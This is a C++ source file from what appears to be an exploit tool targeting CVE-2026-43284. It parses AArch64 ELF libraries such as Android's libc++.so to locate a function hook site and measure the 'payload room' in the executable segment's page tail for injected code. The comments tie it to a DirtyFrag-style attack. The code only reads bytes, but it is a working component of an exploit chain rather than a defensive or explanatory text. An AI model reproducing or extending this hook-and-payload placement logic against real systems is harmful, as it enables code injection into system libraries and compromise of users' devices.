/* CVE-2026-43284 read-only ELF hook-target location (B5-5) -- implementation.
 *
 * Pure byte-span parsing: no file descriptor, no syscall, no allocation and no
 * write of any kind. Every offset is validated against the image before use. */

#include "backend/cve_2026_43284/steps/elf_hook.hpp"

#include <cstddef>
#include <cstdint>
#include <cstring>
#include <string_view>

namespace ghostlock::backend::cve_2026_43284::steps {
    namespace {
        constexpr std::uint64_t kElfVersionCurrent = 1U;

        std::uint16_t read_u16(const std::uint8_t *p) noexcept {
            return static_cast<std::uint16_t>(static_cast<std::uint16_t>(p[0]) |
                                              (static_cast<std::uint16_t>(p[1]) << 8U));
        }

        std::uint32_t read_u32(const std::uint8_t *p) noexcept {
            return static_cast<std::uint32_t>(p[0]) |
                   (static_cast<std::uint32_t>(p[1]) << 8U) |
                   (static_cast<std::uint32_t>(p[2]) << 16U) |
                   (static_cast<std::uint32_t>(p[3]) << 24U);
        }

        std::uint64_t read_u64(const std::uint8_t *p) noexcept {
            return static_cast<std::uint64_t>(read_u32(p)) |
                   (static_cast<std::uint64_t>(read_u32(p + 4U)) << 32U);
        }

        /* True when [begin, begin + length) lies inside [0, limit). */
        bool within(std::uint64_t begin, std::uint64_t length, std::uint64_t limit) noexcept {
            return begin <= limit && length <= limit - begin;
        }

        bool ranges_overlap(std::uint64_t a, std::uint64_t a_len, std::uint64_t b,
                            std::uint64_t b_len) noexcept {
            if (a_len == 0U || b_len == 0U) {
                return false;
            }
            if (a >= b) {
                return a - b < b_len;
            }
            return b - a < a_len;
        }

        /* Smallest mapping granularity we can trust without a runtime page-size
         * query: the 4 KiB base page. The ELF's p_align is the segment's declared
         * alignment (Android archives use the 16 KiB max-page-size), which can
         * exceed the page the loader actually maps with. */
        constexpr std::uint64_t kElfBasePageBytes = 4096U;

        /* Rounding unit for the executable segment's page tail. p_align is only
         * used when it is finer than the base page; a larger p_align (e.g. the
         * common 0x4000) must not inflate a 4 KiB-page mapping. The resulting
         * room is a subset of the real mapping on any page size (fail-closed). */
        std::uint64_t effective_page_bytes(std::uint64_t p_align) noexcept {
            if (p_align > 1U && p_align < kElfBasePageBytes) {
                return p_align;
            }
            return kElfBasePageBytes;
        }

        std::uint64_t page_align_down(std::uint64_t value, std::uint64_t page) noexcept {
            if (page <= 1U) {
                return value;
            }
            return value - (value % page);
        }

        std::uint64_t page_align_up(std::uint64_t value, std::uint64_t page) noexcept {
            if (page <= 1U) {
                return value;
            }
            const std::uint64_t remainder = value % page;
            if (remainder == 0U) {
                return value;
            }
            const std::uint64_t delta = page - remainder;
            constexpr std::uint64_t kMax = ~std::uint64_t{0};
            if (value > kMax - delta) {
                return kMax;
            }
            return value + delta;
        }

        struct SectionHeader final {
            std::uint32_t name = 0U;
            std::uint32_t type = 0U;
            std::uint64_t flags = 0U;
            std::uint64_t addr = 0U;
            std::uint64_t offset = 0U;
            std::uint64_t size = 0U;
            std::uint32_t link = 0U;
            std::uint64_t entsize = 0U;
        };

        bool read_section_header(const std::uint8_t *data, std::size_t size,
                                 const ElfImage &image, std::uint16_t index,
                                 SectionHeader &out) noexcept {
            if (index >= image.shnum) {
                return false;
            }
            const std::uint64_t base = image.shoff +
                                       static_cast<std::uint64_t>(index) *
                                               kElfSectionHeaderBytes;
            if (!within(base, kElfSectionHeaderBytes, size)) {
                return false;
            }
            const std::uint8_t *p = data + static_cast<std::size_t>(base);
            out.name = read_u32(p);
            out.type = read_u32(p + 4U);
            out.flags = read_u64(p + 8U);
            out.addr = read_u64(p + 0x10U);
            out.offset = read_u64(p + 0x18U);
            out.size = read_u64(p + 0x20U);
            out.link = read_u32(p + 0x28U);
            out.entsize = read_u64(p + 0x38U);
            return true;
        }

        /* Bounded NUL-terminated view at data[begin, end). */
        std::string_view bounded_cstr(const std::uint8_t *data, std::size_t begin,
                                      std::size_t end) noexcept {
            std::size_t pos = begin;
            while (pos < end && data[pos] != 0U) {
                ++pos;
            }
            return std::string_view(reinterpret_cast<const char *>(data + begin), pos - begin);
        }

        /* Section name for index, or empty when the header/name is unreadable. */
        bool section_name(const std::uint8_t *data, std::size_t size, const ElfImage &image,
                          const SectionHeader &header, std::uint16_t index,
                          std::string_view &out) noexcept {
            (void)index;
            SectionHeader strings{};
            if (!read_section_header(data, size, image, image.shstrndx, strings)) {
                return false;
            }
            if (!within(strings.offset, strings.size, size)) {
                return false;
            }
            if (static_cast<std::uint64_t>(header.name) >= strings.size) {
                out = {};
                return true;
            }
            const std::size_t begin =
                    static_cast<std::size_t>(strings.offset) + header.name;
            const std::size_t end = static_cast<std::size_t>(strings.offset + strings.size);
            out = bounded_cstr(data, begin, end);
            return true;
        }

        /* Fill an ElfRange from a section header after range validation. */
        bool section_range(const std::uint8_t *data, std::size_t size,
                           const SectionHeader &header, ElfRange &out,
                           ElfError &error) noexcept {
            (void)data;
            if (!within(header.offset, header.size, size)) {
                error = ElfError::OutOfBounds;
                return false;
            }
            out.file_offset = header.offset;
            out.size = header.size;
            out.vaddr = header.addr;
            return true;
        }

        /* The executable section containing vaddr, if any. */
        bool find_exec_section_at(const std::uint8_t *data, std::size_t size,
                                  const ElfImage &image, std::uint64_t vaddr,
                                  ElfRange &out) noexcept {
            for (std::uint16_t i = 0U; i < image.shnum; ++i) {
                SectionHeader header{};
                if (!read_section_header(data, size, image, i, header)) {
                    continue;
                }
                if ((header.flags & kElfFlagAlloc) == 0U ||
                    (header.flags & kElfFlagExecInstr) == 0U) {
                    continue;
                }
                if (vaddr < header.addr || vaddr - header.addr >= header.size) {
                    continue;
                }
                if (!within(header.offset, header.size, size)) {
                    return false;
                }
                out.file_offset = header.offset;
                out.size = header.size;
                out.vaddr = header.addr;
                return true;
            }
            return false;
        }

        /* A relocation target is treated as an 8-byte window (an ADRP/LDST pair
         * can rewrite the instruction word). A malformed .rela table fails
         * closed: the site is reported as relocated. */
        bool relocation_overlaps(const std::uint8_t *data, std::size_t size,
                                 const ElfImage &image, std::uint64_t vaddr,
                                 std::uint64_t length) noexcept {
            const ElfRange tables[2] = {image.rela_dyn, image.rela_plt};
            const bool present[2] = {image.has_rela_dyn, image.has_rela_plt};
            for (std::size_t t = 0U; t < 2U; ++t) {
                if (!present[t]) {
                    continue;
                }
                if (tables[t].size % kElfRelaBytes != 0U) {
                    return true;
                }
                const std::uint64_t count = tables[t].size / kElfRelaBytes;
                for (std::uint64_t i = 0U; i < count; ++i) {
                    const std::uint64_t base =
                            tables[t].file_offset + i * kElfRelaBytes;
                    if (!within(base, kElfRelaBytes, size)) {
                        return true;
                    }
                    const std::uint64_t r_offset =
                            read_u64(data + static_cast<std::size_t>(base));
                    if (ranges_overlap(vaddr, length, r_offset, 8U)) {
                        return true;
                    }
                }
            }
            return false;
        }

        /* How many bytes after the executable segment end are still inside a
         * mapped executable region.
         *
         * Source (a) is the historical BSS tail (p_memsz - p_filesz). Source
         * (b) is the page-aligned tail of the file page that holds the segment
         * end: the loader maps whole base pages, so when p_filesz is not page
         * aligned the bytes up to the next page boundary are part of the
         * segment's executable mapping. The real /system/lib64/libc++.so
         * executable LOAD is exactly this shape (p_filesz == p_memsz, its end
         * shares a file page with the following RW LOAD, which maps that page
         * at a disjoint vaddr), and upstream DirtyFrag relies on the same page.
         *
         * (b) is clamped twice so the landing interval stays fail-closed: it
         * never crosses EOF, and it never enters another PT_LOAD's page-aligned
         * mapping (if such a mapping already covers the segment end the room is
         * zero). The result is the larger of (a) and the clamped (b), so the
         * pre-existing BSS path is unchanged. */
        std::uint64_t payload_room(const std::uint8_t *data, std::size_t size,
                                   const ElfImage &image) noexcept {
            const std::uint64_t bss_room =
                    image.exec_memsz > image.exec_segment.size
                            ? image.exec_memsz - image.exec_segment.size
                            : 0U;
            const std::uint64_t site_file =
                    image.exec_segment.file_offset + image.exec_segment.size;
            const std::uint64_t site_vaddr =
                    image.exec_segment.vaddr + image.exec_segment.size;
            if (site_file >= static_cast<std::uint64_t>(size)) {
                return bss_room;
            }
            const std::uint64_t page = effective_page_bytes(image.exec_align);
            const std::uint64_t segment_page_end = page_align_up(site_file, page);
            std::uint64_t room = segment_page_end - site_file;
            /* Never read past EOF. */
            const std::uint64_t eof_room =
                    static_cast<std::uint64_t>(size) - site_file;
            if (room > eof_room) {
                room = eof_room;
            }
            /* The landing interval must not overlap any other PT_LOAD's
             * page-aligned mapping; cut back to that mapping's start (which,
             * being page aligned, is either at the segment end itself or at or
             * beyond the next page boundary). */
            for (std::uint16_t i = 0U; i < image.phnum; ++i) {
                if (i == image.exec_segment_index) {
                    continue;
                }
                const std::uint64_t base =
                        image.phoff + static_cast<std::uint64_t>(i) *
                                              kElfProgramHeaderBytes;
                if (!within(base, kElfProgramHeaderBytes, size)) {
                    continue;
                }
                const std::uint8_t *p = data + static_cast<std::size_t>(base);
                if (read_u32(p) != kElfProgramLoad) {
                    continue;
                }
                const std::uint64_t p_offset = read_u64(p + 8U);
                const std::uint64_t p_vaddr = read_u64(p + 0x10U);
                const std::uint64_t p_filesz = read_u64(p + 0x20U);
                if (p_filesz == 0U || !within(p_offset, p_filesz, size)) {
                    continue;
                }
                const std::uint64_t map_file_start = page_align_down(p_offset, page);
                const std::uint64_t map_file_end =
                        page_align_up(p_offset + p_filesz, page);
                const std::uint64_t vaddr_delta = p_offset - map_file_start;
                if (p_vaddr < vaddr_delta) {
                    /* Malformed relation; fail closed against this mapping. */
                    room = 0U;
                    continue;
                }
                const std::uint64_t map_vaddr_start = p_vaddr - vaddr_delta;
                const std::uint64_t map_span = map_file_end - map_file_start;
                constexpr std::uint64_t kMax = ~std::uint64_t{0};
                if (map_vaddr_start > kMax - map_span) {
                    /* Malformed mapping range; fail closed. */
                    room = 0U;
                    continue;
                }
                const std::uint64_t map_vaddr_end = map_vaddr_start + map_span;
                if (map_vaddr_start >= site_vaddr + room) {
                    continue;
                }
                if (map_vaddr_end <= site_vaddr) {
                    continue;
                }
                if (map_vaddr_start <= site_vaddr) {
                    /* This mapping already covers the landing site. */
                    room = 0U;
                } else {
                    room = map_vaddr_start - site_vaddr;
                }
            }
            /* Defensive bound: stay inside the executable segment's own
             * page-aligned mapping. */
            const std::uint64_t exec_map_end_vaddr =
                    image.exec_segment.vaddr +
                    (segment_page_end - image.exec_segment.file_offset);
            if (exec_map_end_vaddr <= site_vaddr) {
                room = 0U;
            } else if (room > exec_map_end_vaddr - site_vaddr) {
                room = exec_map_end_vaddr - site_vaddr;
            }
            return bss_room > room ? bss_room : room;
        }

        /* Shared tail for the symbol and offset entry points. */
        bool finalize_target(const std::uint8_t *data, std::size_t size, const ElfImage &image,
                             std::uint64_t hook_file_offset, std::uint64_t hook_vaddr,
                             std::uint64_t symbol_vaddr, std::uint64_t symbol_size,
                             const ElfRange &section, HookGuardPolicy policy,
                             HookTarget &out, ElfError &error) noexcept {
            error = ElfError::None;
            out = HookTarget{};
            if (!image.has_exec_segment) {
                error = ElfError::NoExecutableSegment;
                return false;
            }
            if (hook_vaddr < image.exec_segment.vaddr) {
                error = ElfError::HookNotPatchable;
                return false;
            }
            const std::uint64_t seg_delta = hook_vaddr - image.exec_segment.vaddr;
            if (seg_delta + 4U > image.exec_segment.size ||
                !within(hook_file_offset, 4U, size)) {
                error = ElfError::HookNotPatchable;
                return false;
            }

            out.valid = false;
            out.hook_file_offset = hook_file_offset;
            out.hook_vaddr = hook_vaddr;
            out.symbol_vaddr = symbol_vaddr;
            out.symbol_size = symbol_size;
            out.hook_section = section;
            std::uint32_t instruction =
                    read_u32(data + static_cast<std::size_t>(hook_file_offset));

            if (is_prologue_guard(instruction)) {
                if (policy == HookGuardPolicy::Reject) {
                    out = HookTarget{};
                    error = ElfError::PrologueGuard;
                    return false;
                }
                if (seg_delta + 8U > image.exec_segment.size ||
                    !within(hook_file_offset + 4U, 4U, size)) {
                    out = HookTarget{};
                    error = ElfError::HookNotPatchable;
                    return false;
                }
                const std::uint64_t next_vaddr = hook_vaddr + 4U;
                ElfRange next_section{};
                if (!find_exec_section_at(data, size, image, next_vaddr, next_section)) {
                    out = HookTarget{};
                    error = ElfError::HookNotPatchable;
                    return false;
                }
                const std::uint32_t next_instruction =
                        read_u32(data + static_cast<std::size_t>(hook_file_offset + 4U));
                if (is_prologue_guard(next_instruction)) {
                    out = HookTarget{};
                    error = ElfError::PrologueGuard;
                    return false;
                }
                out.guard_instruction = instruction;
                out.guard_skipped = true;
                out.hook_file_offset = hook_file_offset + 4U;
                out.hook_vaddr = next_vaddr;
                out.hook_section = next_section;
                instruction = next_instruction;
            }
            out.displaced_instruction = instruction;

            if (relocation_overlaps(data, size, image, out.hook_vaddr, 4U)) {
                out = HookTarget{};
                error = ElfError::RelocationOverlap;
                return false;
            }

            out.payload_file_offset = image.exec_segment.file_offset + image.exec_segment.size;
            out.payload_vaddr = image.exec_segment.vaddr + image.exec_segment.size;
            out.payload_max_bytes = payload_room(data, size, image);
            out.valid = true;
            return true;
        }
    } // namespace

    bool parse_elf_image(const std::uint8_t *data, std::size_t size, ElfImage &out,
                         ElfError &error) noexcept {
        out = ElfImage{};
        error = ElfError::None;
        if (data == nullptr) {
            error = ElfError::NullImage;
            return false;
        }
        if (size < kElfHeaderBytes) {
            error = ElfError::TooSmall;
            return false;
        }
        if (size > kElfMaxImageBytes) {
            error = ElfError::TooLarge;
            return false;
        }
        if (data[0] != 0x7FU || data[1] != 'E' || data[2] != 'L' || data[3] != 'F') {
            error = ElfError::NotElf;
            return false;
        }
        if (data[4] != 2U) {
            error = ElfError::Not64Bit;
            return false;
        }
        if (data[5] != 1U) {
            error = ElfError::NotLittleEndian;
            return false;
        }
        if (data[6] != kElfVersionCurrent ||
            read_u32(data + 0x14U) != kElfVersionCurrent) {
            error = ElfError::NotElf;
            return false;
        }
        out.type = read_u16(data + 0x10U);
        if (out.type != kElfTypeExec && out.type != kElfTypeDyn) {
            error = ElfError::NotExecutableImage;
            return false;
        }
        out.machine = read_u16(data + 0x12U);
        if (out.machine != kElfMachineAarch64) {
            error = ElfError::NotAarch64;
            return false;
        }

        out.phoff = read_u64(data + 0x20U);
        out.shoff = read_u64(data + 0x28U);
        out.phentsize = read_u16(data + 0x36U);
        out.phnum = read_u16(data + 0x38U);
        out.shentsize = read_u16(data + 0x3AU);
        out.shnum = read_u16(data + 0x3CU);
        out.shstrndx = read_u16(data + 0x3EU);

        if (out.phnum != 0U) {
            if (out.phentsize != kElfProgramHeaderBytes) {
                error = ElfError::BadProgramHeaders;
                return false;
            }
            if (!within(out.phoff, static_cast<std::uint64_t>(out.phnum) *
                                            kElfProgramHeaderBytes,
                        size)) {
                error = ElfError::BadProgramHeaders;
                return false;
            }
        }

        if (out.shentsize != kElfSectionHeaderBytes || out.shnum == 0U ||
            out.shstrndx >= out.shnum) {
            error = ElfError::BadSectionHeaders;
            return false;
        }
        if (!within(out.shoff,
                    static_cast<std::uint64_t>(out.shnum) * kElfSectionHeaderBytes, size)) {
            error = ElfError::BadSectionHeaders;
            return false;
        }

        /* Locate the sections this module consumes. */
        for (std::uint16_t i = 0U; i < out.shnum; ++i) {
            SectionHeader header{};
            if (!read_section_header(data, size, out, i, header)) {
                error = ElfError::BadSectionHeaders;
                return false;
            }
            std::string_view name{};
            if (!section_name(data, size, out, header, i, name)) {
                error = ElfError::BadSectionHeaders;
                return false;
            }
            if (name == ".text") {
                if (!section_range(data, size, header, out.text, error)) {
                    return false;
                }
                out.has_text = true;
            } else if (name == ".dynsym") {
                if (!section_range(data, size, header, out.dynsym, error)) {
                    return false;
                }
                out.has_dynsym = true;
            } else if (name == ".dynstr") {
                if (!section_range(data, size, header, out.dynstr, error)) {
                    return false;
                }
                out.has_dynstr = true;
            } else if (name == ".rela.dyn") {
                if (!section_range(data, size, header, out.rela_dyn, error)) {
                    return false;
                }
                out.has_rela_dyn = true;
            } else if (name == ".rela.plt") {
                if (!section_range(data, size, header, out.rela_plt, error)) {
                    return false;
                }
                out.has_rela_plt = true;
            }
        }
        if (!out.has_text) {
            error = ElfError::MissingText;
            return false;
        }

        /* Choose the executable PT_LOAD that maps .text, else the first one. */
        bool chosen = false;
        for (std::uint16_t i = 0U; i < out.phnum; ++i) {
            const std::uint64_t base =
                    out.phoff + static_cast<std::uint64_t>(i) * kElfProgramHeaderBytes;
            const std::uint8_t *p = data + static_cast<std::size_t>(base);
            const std::uint32_t type = read_u32(p);
            const std::uint32_t flags = read_u32(p + 4U);
            const std::uint64_t p_offset = read_u64(p + 8U);
            const std::uint64_t p_vaddr = read_u64(p + 0x10U);
            const std::uint64_t p_filesz = read_u64(p + 0x20U);
            const std::uint64_t p_memsz = read_u64(p + 0x28U);
            const std::uint64_t p_align = read_u64(p + 0x30U);
            if (type != kElfProgramLoad || (flags & kElfFlagExec) == 0U) {
                continue;
            }
            if (!within(p_offset, p_filesz, size)) {
                error = ElfError::OutOfBounds;
                return false;
            }
            const bool maps_text =
                    out.text.vaddr >= p_vaddr && out.text.vaddr - p_vaddr < p_filesz;
            if (!chosen || maps_text) {
                out.exec_segment.file_offset = p_offset;
                out.exec_segment.size = p_filesz;
                out.exec_segment.vaddr = p_vaddr;
                out.exec_memsz = p_memsz;
                out.exec_align = p_align;
                out.exec_segment_index = i;
                out.has_exec_segment = true;
                chosen = true;
                if (maps_text) {
                    break;
                }
            }
        }
        if (!out.has_exec_segment) {
            error = ElfError::NoExecutableSegment;
            return false;
        }
        return true;
    }

    bool find_elf_symbol(const std::uint8_t *data, std::size_t size, const ElfImage &image,
                         std::string_view name, ElfSymbol &out, ElfError &error) noexcept {
        out = ElfSymbol{};
        error = ElfError::None;
        if (data == nullptr) {
            error = ElfError::NullImage;
            return false;
        }
        if (size < kElfHeaderBytes) {
            error = ElfError::TooSmall;
            return false;
        }
        if (!image.has_dynsym) {
            error = ElfError::MissingDynsym;
            return false;
        }
        if (!image.has_dynstr) {
            error = ElfError::MissingDynstr;
            return false;
        }
        if (image.dynsym.size % kElfSymbolBytes != 0U) {
            error = ElfError::OutOfBounds;
            return false;
        }
        const std::uint64_t dynsym_begin = image.dynsym.file_offset;
        const std::uint64_t dynstr_begin = image.dynstr.file_offset;
        const std::uint64_t dynstr_size = image.dynstr.size;
        const std::uint64_t count = image.dynsym.size / kElfSymbolBytes;
        for (std::uint64_t i = 0U; i < count; ++i) {
            const std::uint64_t base = dynsym_begin + i * kElfSymbolBytes;
            if (!within(base, kElfSymbolBytes, size)) {
                error = ElfError::OutOfBounds;
                return false;
            }
            const std::uint8_t *p = data + static_cast<std::size_t>(base);
            const std::uint32_t st_name = read_u32(p);
            if (static_cast<std::uint64_t>(st_name) >= dynstr_size) {
                continue;
            }
            const std::string_view candidate = bounded_cstr(
                    data, static_cast<std::size_t>(dynstr_begin) + st_name,
                    static_cast<std::size_t>(dynstr_begin + dynstr_size));
            if (candidate != name) {
                continue;
            }
            const std::uint8_t st_info = p[4];
            const std::uint16_t st_shndx = read_u16(p + 6U);
            const std::uint64_t st_value = read_u64(p + 8U);
            const std::uint64_t st_size = read_u64(p + 16U);
            if (st_shndx == kElfSectionUndef) {
                error = ElfError::SymbolUndefined;
                return false;
            }
            if (st_shndx >= image.shnum) {
                error = ElfError::SymbolBadSection;
                return false;
            }
            SectionHeader section{};
            if (!read_section_header(data, size, image, st_shndx, section)) {
                error = ElfError::SymbolBadSection;
                return false;
            }
            if ((section.flags & kElfFlagAlloc) == 0U ||
                (section.flags & kElfFlagExecInstr) == 0U) {
                error = ElfError::SymbolBadSection;
                return false;
            }
            if (!within(section.offset, section.size, size)) {
                error = ElfError::OutOfBounds;
                return false;
            }
            if (st_value < section.addr || st_value - section.addr >= section.size) {
                error = ElfError::SymbolBadSection;
                return false;
            }
            if (!image.has_exec_segment || st_value < image.exec_segment.vaddr ||
                st_value - image.exec_segment.vaddr >= image.exec_segment.size) {
                error = ElfError::SymbolBadSection;
                return false;
            }
            out.name = candidate;
            out.value = st_value;
            out.size = st_size;
            out.info = st_info;
            out.section_index = st_shndx;
            out.file_offset = image.exec_segment.file_offset +
                              (st_value - image.exec_segment.vaddr);
            out.section.file_offset = section.offset;
            out.section.size = section.size;
            out.section.vaddr = section.addr;
            return true;
        }
        error = ElfError::SymbolNotFound;
        return false;
    }

    bool locate_hook_target(const std::uint8_t *data, std::size_t size, const ElfImage &image,
                            std::string_view symbol, HookGuardPolicy policy, HookTarget &out,
                            ElfError &error) noexcept {
        out = HookTarget{};
        error = ElfError::None;
        ElfSymbol resolved{};
        if (!find_elf_symbol(data, size, image, symbol, resolved, error)) {
            return false;
        }
        return finalize_target(data, size, image, resolved.file_offset, resolved.value,
                               resolved.value, resolved.size, resolved.section, policy, out,
                               error);
    }

    bool locate_hook_target_at(const std::uint8_t *data, std::size_t size,
                               const ElfImage &image, std::uint64_t file_offset,
                               HookGuardPolicy policy, HookTarget &out,
                               ElfError &error) noexcept {
        out = HookTarget{};
        error = ElfError::None;
        if (data == nullptr) {
            error = ElfError::NullImage;
            return false;
        }
        if (!image.has_exec_segment) {
            error = ElfError::NoExecutableSegment;
            return false;
        }
        if (file_offset % 4U != 0U || file_offset < image.exec_segment.file_offset) {
            error = ElfError::HookNotPatchable;
            return false;
        }
        const std::uint64_t delta = file_offset - image.exec_segment.file_offset;
        if (delta + 4U > image.exec_segment.size) {
            error = ElfError::HookNotPatchable;
            return false;
        }
        const std::uint64_t vaddr = image.exec_segment.vaddr + delta;
        ElfRange section{};
        if (!find_exec_section_at(data, size, image, vaddr, section)) {
            error = ElfError::HookNotPatchable;
            return false;
        }
        return finalize_target(data, size, image, file_offset, vaddr, vaddr, 0U, section,
                               policy, out, error);
    }

} // namespace ghostlock::backend::cve_2026_43284::steps
